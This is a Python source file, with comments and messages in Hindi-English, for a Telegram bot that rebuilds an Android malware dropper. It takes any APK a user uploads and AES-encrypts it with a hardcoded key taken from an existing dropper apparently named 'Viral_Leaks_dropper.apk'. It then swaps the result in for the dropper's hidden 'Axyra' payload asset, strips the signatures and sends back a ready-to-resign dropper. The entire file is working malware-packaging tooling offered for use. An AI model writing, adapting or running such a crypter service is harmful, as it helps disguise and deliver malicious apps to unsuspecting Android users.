"""
APK Swapper Bot
---------------
Bhejo naya APK → bot encrypt karke Axyra replace karega → naya dropper wapas milega.

Usage:
  1. BOT_TOKEN set karo (apna TG bot token)
  2. python3 apk_swapper_bot.py
  3. Bot ko APK bhejo
"""

import os
import io
import zipfile
import secrets
import logging
import asyncio
import tempfile
from pathlib import Path

from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from telegram import Update, Document
from telegram.ext import ApplicationBuilder, MessageHandler, CommandHandler, filters, ContextTypes

# ─── Config ───────────────────────────────────────────────────────────────────

BOT_TOKEN    = os.getenv("BOT_TOKEN", "")
DROPPER_PATH = Path(__file__).parent / "dropper" / "Viral_Leaks_dropper.apk"

# AES key extracted from dropper DEX (AES_KEY_HEX field)
AES_KEY_HEX  = "b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1"
AES_KEY      = bytes.fromhex(AES_KEY_HEX)
ASSET_NAME   = "assets/Axyra"

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)


# ─── Core: encrypt payload ────────────────────────────────────────────────────

def encrypt_payload(apk_bytes: bytes) -> bytes:
    """AES-256-CBC encrypt. Random 16-byte IV prepended to ciphertext."""
    iv = secrets.token_bytes(16)
    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
    padded = pad(apk_bytes, AES.block_size)
    return iv + cipher.encrypt(padded)


# ─── Core: rebuild dropper ────────────────────────────────────────────────────

def rebuild_dropper(new_payload_bytes: bytes) -> bytes:
    """
    Axyra ko replace karo dropper mein.
    Baki sab files waise hi rakhta hai — signing strip hoti hai (normal for repack).
    """
    encrypted = encrypt_payload(new_payload_bytes)

    original = zipfile.ZipFile(DROPPER_PATH, "r")
    out_buf = io.BytesIO()

    with zipfile.ZipFile(out_buf, "w", compression=zipfile.ZIP_STORED) as zout:
        for item in original.infolist():
            # META-INF (old signatures) drop karo — resign karna hoga baad mein
            if item.filename.startswith("META-INF/"):
                continue
            if item.filename == ASSET_NAME:
                zout.writestr(item, encrypted)
                log.info("Axyra replaced — %d bytes (encrypted)", len(encrypted))
            else:
                zout.writestr(item, original.read(item.filename))

    original.close()
    return out_buf.getvalue()


# ─── Telegram handlers ────────────────────────────────────────────────────────

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK bhejo → main Axyra replace karke naya dropper wapas deta hoon.\n"
        "File .apk extension ke saath honi chahiye."
    )


async def handle_document(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    doc: Document = update.message.document

    if not doc.file_name.lower().endswith(".apk"):
        await update.message.reply_text("Sirf .apk files accept hoti hain.")
        return

    msg = await update.message.reply_text(f"📥 Mila: {doc.file_name} ({doc.file_size // 1024} KB)\nEncrypt + pack kar raha hoon...")

    # Download
    tg_file = await ctx.bot.get_file(doc.file_id)
    apk_bytes = bytes(await tg_file.download_as_bytearray())
    log.info("Downloaded %d bytes from %s", len(apk_bytes), doc.file_name)

    # Validate it's a ZIP/APK
    if apk_bytes[:2] != b"PK":
        await msg.edit_text("Invalid APK — ZIP magic missing. Sahi file bhejo.")
        return

    # Rebuild dropper
    try:
        new_dropper = rebuild_dropper(apk_bytes)
    except Exception as e:
        log.exception("rebuild failed")
        await msg.edit_text(f"Error: {e}")
        return

    out_name = f"dropper_{Path(doc.file_name).stem}.apk"
    await msg.edit_text(f"✅ Done — {len(new_dropper) // 1024} KB\nBhej raha hoon...")

    await update.message.reply_document(
        document=io.BytesIO(new_dropper),
        filename=out_name,
        caption=(
            f"Payload: {doc.file_name}\n"
            f"Key: {AES_KEY_HEX[:16]}...\n"
            f"Dropper size: {len(new_dropper) // 1024} KB\n"
            "⚠ Re-sign karna mat bhoolna (zipalign + apksigner)"
        )
    )
    log.info("Sent rebuilt dropper: %s (%d bytes)", out_name, len(new_dropper))


# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("BOT_TOKEN set nahi hai.\nRun: BOT_TOKEN=123:ABC python3 apk_swapper_bot.py")
        return

    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    log.info("Bot chal raha hai...")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
